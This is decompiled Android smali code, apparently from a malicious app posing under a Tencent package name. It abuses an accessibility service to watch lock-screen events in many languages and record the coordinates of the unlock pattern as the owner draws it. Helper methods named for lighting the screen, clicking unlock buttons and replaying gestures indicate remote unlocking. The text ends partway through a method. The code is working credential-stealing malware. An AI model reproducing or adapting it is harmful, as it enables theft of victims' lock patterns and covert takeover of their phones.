.class public Lcom/tencent/ScreenLockMonitor;
.super Ljava/lang/Object;
.source "Loc_tunesxconcerningn10_k.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/ScreenLockMonitor$Node;
    }
.end annotation


# static fields
.field static ifAuto:Z

.field static ifStartRecord:Z

.field static screenLockPointList:Ljava/util/LinkedList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedList<",
            "Lcom/tencent/ScreenLockMonitor$Node;",
            ">;"
        }
    .end annotation
.end field

.field static screenLockPointSet:Ljava/util/Set;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Set<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field static successcreenLockPointList:Ljava/util/LinkedList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/LinkedList<",
            "Lcom/tencent/ScreenLockMonitor$Node;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 32
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    .line 33
    new-instance v0, Ljava/util/HashSet;

    invoke-direct {v0}, Ljava/util/HashSet;-><init>()V

    sput-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    .line 34
    new-instance v0, Ljava/util/LinkedList;

    invoke-direct {v0}, Ljava/util/LinkedList;-><init>()V

    sput-object v0, Lcom/tencent/ScreenLockMonitor;->successcreenLockPointList:Ljava/util/LinkedList;

    const/4 v0, 0x0

    .line 35
    sput-boolean v0, Lcom/tencent/ScreenLockMonitor;->ifAuto:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 18
    invoke-static {p0}, Lcom/tencent/ScreenLockMonitor;->lightScreen(Lcom/tencent/AccessibilityServiceCore;)V

    return-void
.end method

.method static synthetic access$100(Lcom/tencent/AccessibilityServiceCore;)I
    .locals 0

    .line 18
    invoke-static {p0}, Lcom/tencent/ScreenLockMonitor;->getScreenType(Lcom/tencent/AccessibilityServiceCore;)I

    move-result p0

    return p0
.end method

.method static synthetic access$200(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V
    .locals 0

    .line 18
    invoke-static {p0, p1}, Lcom/tencent/ScreenLockMonitor;->clickUnlockButton(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$300(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 18
    invoke-static {p0}, Lcom/tencent/ScreenLockMonitor;->clickErrorUnlockButtonByGusture(Lcom/tencent/AccessibilityServiceCore;)V

    return-void
.end method

.method static synthetic access$400(Landroid/graphics/Path;ILcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 18
    invoke-static {p0, p1, p2}, Lcom/tencent/ScreenLockMonitor;->performGestureByCount(Landroid/graphics/Path;ILcom/tencent/AccessibilityServiceCore;)V

    return-void
.end method

.method public static checkEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10

    .line 40
    sget-boolean v0, Lcom/tencent/ScreenLockMonitor;->ifStartRecord:Z

    const/16 v1, 0x4000

    const/4 v2, 0x0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    if-ne v0, v1, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 41
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u56fe\u6848\u7ed8\u5236\u5b8c\u6210"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 42
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u5716\u6848\u7e6a\u88fd\u5b8c\u6210"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 43
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u5716\u5f62\u7e6a\u88fd\u5b8c\u6210"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 44
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u5df2\u756b\u51fa\u89e3\u9396\u5716\u6848"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 45
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u5df2\u756b\u51fa\u89e3\u9396\u5716\u5f62"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 46
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u30d1\u30bf\u30fc\u30f3\u304c\u5b8c\u4e86\u3057\u307e\u3057\u305f"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 47
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u30d1\u30bf\u30fc\u30f3\u306e\u63cf\u753b\u304c\u5b8c\u4e86\u3057\u307e\u3057\u305f"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 48
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "Pattern completed"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 49
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\ud328\ud134 \uc644\ub8cc"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 50
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\ud328\ud134\uc774 \uc644\ub8cc\ub428"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 51
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u0f62\u0f92\u0fb1\u0f53\u0f0b\u0f62\u0f72\u0f66\u0f0b\u0f56\u0fb2\u0f72\u0f66\u0f0b\u0f5a\u0f62\u0f0d"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 52
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "\u0626\u06d5\u0646\u062f\u0649\u0632\u06d5 \u062a\u0627\u0645\u0627\u0645\u0644\u0627\u0646\u062f\u0649"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 55
    :cond_0
    sput-boolean v2, Lcom/tencent/ScreenLockMonitor;->ifStartRecord:Z

    .line 58
    :cond_1
    sget-boolean v0, Lcom/tencent/ScreenLockMonitor;->ifStartRecord:Z

    const/4 v3, 0x1

    if-eqz v0, :cond_4

    sget-boolean v0, Lcom/tencent/ScreenLockMonitor;->ifAuto:Z

    if-nez v0, :cond_4

    .line 59
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    .line 60
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    const/16 v5, 0x9

    if-ne v4, v5, :cond_4

    move v4, v2

    .line 61
    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v5

    if-ge v4, v5, :cond_4

    .line 62
    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getActionList()Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo$AccessibilityAction;->getId()I

    move-result v5

    const/16 v6, 0x40

    if-ne v5, v6, :cond_3

    .line 63
    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    .line 65
    sget-object v6, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {v6, v5}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2

    goto :goto_1

    .line 68
    :cond_2
    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6}, Landroid/graphics/Rect;-><init>()V

    .line 69
    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 70
    new-instance v7, Lcom/tencent/ScreenLockMonitor$Node;

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerX()I

    move-result v8

    int-to-float v8, v8

    invoke-virtual {v6}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    int-to-float v6, v6

    const-string v9, " "

    invoke-virtual {v5, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    aget-object v9, v9, v3

    invoke-direct {v7, v8, v6, v9}, Lcom/tencent/ScreenLockMonitor$Node;-><init>(FFLjava/lang/String;)V

    .line 71
    sget-object v6, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v6, v7}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    .line 72
    sget-object v6, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {v6, v5}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    :cond_3
    :goto_1
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 77
    :cond_4
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const-string v4, "2"

    if-ne v0, v1, :cond_8

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_8

    .line 79
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5f00\u59cb\u7ed8\u5236\u56fe\u6848"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 80
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u958b\u59cb\u7e6a\u88fd\u5716\u6848"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 81
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5df2\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u6848"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 82
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u958b\u59cb\u7e6a\u88fd\u5716\u5f62"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 83
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u5f62"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 84
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5df2\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u5f62"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 85
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 86
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30d1\u30bf\u30fc\u30f3\u304c\u958b\u59cb\u3055\u308c\u307e\u3057\u305f"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 87
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30d1\u30bf\u30fc\u30f3\u306e\u63cf\u753b\u3092\u958b\u59cb\u3057\u307e\u3057\u305f"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 88
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Pattern started"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 89
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\ud328\ud134 \uc2dc\uc791"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 90
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\ud328\ud134\uc774 \uc2dc\uc791\ub428"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 91
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u0f62\u0f92\u0fb1\u0f53\u0f0b\u0f62\u0f72\u0f66\u0f0b\u0f60\u0f56\u0fb2\u0f72\u0f0b\u0f60\u0f42\u0f7c\u0f0b\u0f5a\u0f74\u0f42\u0f66\u0f0b\u0f54\u0f0d"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    .line 92
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u0626\u06d5\u0646\u062f\u0649\u0632\u06d5 \u0633\u0649\u0632\u0649\u0634\u0646\u0649 \u0628\u0627\u0634\u0644\u0649\u062f\u0649"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    goto/16 :goto_2

    .line 98
    :cond_5
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u56fe\u6848\u7ed8\u5236\u4e0d\u6b63\u786e"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 99
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u56fe\u6848\u9519\u8bef"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 100
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5716\u6848\u932f\u8aa4"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 101
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5716\u6848\u7e6a\u88fd\u932f\u8aa4"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 102
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u756b\u51fa\u7684\u5716\u6848\u932f\u8aa4"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 103
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30d1\u30bf\u30fc\u30f3\u304c\u9593\u9055\u3063\u3066\u3044\u307e\u3059"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 104
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30d1\u30bf\u30fc\u30f3\u304c\u6b63\u3057\u304f\u3042\u308a\u307e\u305b\u3093"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 105
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u5165\u529b\u3057\u305f\u30d1\u30bf\u30fc\u30f3\u304c\u6b63\u3057\u304f\u3042\u308a\u307e\u305b\u3093"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 106
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Wrong pattern"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 107
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Incorrect pattern"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 108
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "Incorrect pattern drawn"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 109
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\uc798\ubabb\ub41c \ud328\ud134"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 110
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\uc62c\ubc14\ub974\uc9c0 \uc54a\uc740 \ud328\ud134"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    .line 111
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\ud328\ud134\uc744 \uc798\ubabb \uc785\ub825\ud588\uc2b5\ub2c8\ub2e4"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 115
    :cond_6
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointList:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    .line 116
    sget-object v0, Lcom/tencent/ScreenLockMonitor;->screenLockPointSet:Ljava/util/Set;

    invoke-interface {v0}, Ljava/util/Set;->clear()V

    goto :goto_3

    .line 95
    :cond_7
    :goto_2
    sput-object v4, Lcom/tencent/AccessibilityServiceCore;->passcheck:Ljava/lang/String;

    .line 96
    sput-boolean v3, Lcom/tencent/ScreenLockMonitor;->ifStartRecord:Z

    .line 119
    :cond_8
    :goto_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x20

    if-ne v0, v1, :cond_a

    const-string v0, "com.android.systemui"

    .line 120
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 121
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getContentChangeTypes()I

    move-result v0

    if-ne v0, v1, :cond_a

    .line 122
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_a

    .line 123
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u9501\u5b9a\u5c4f\u5e55\u3002"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 124
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u87a2\u5e55\u9396\u5b9a\u3002"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 125
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u4e0a\u9396\u756b\u9762\u3002"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 126
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "\u30ed\u30c3\u30af\u753b\u9762"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    .line 127
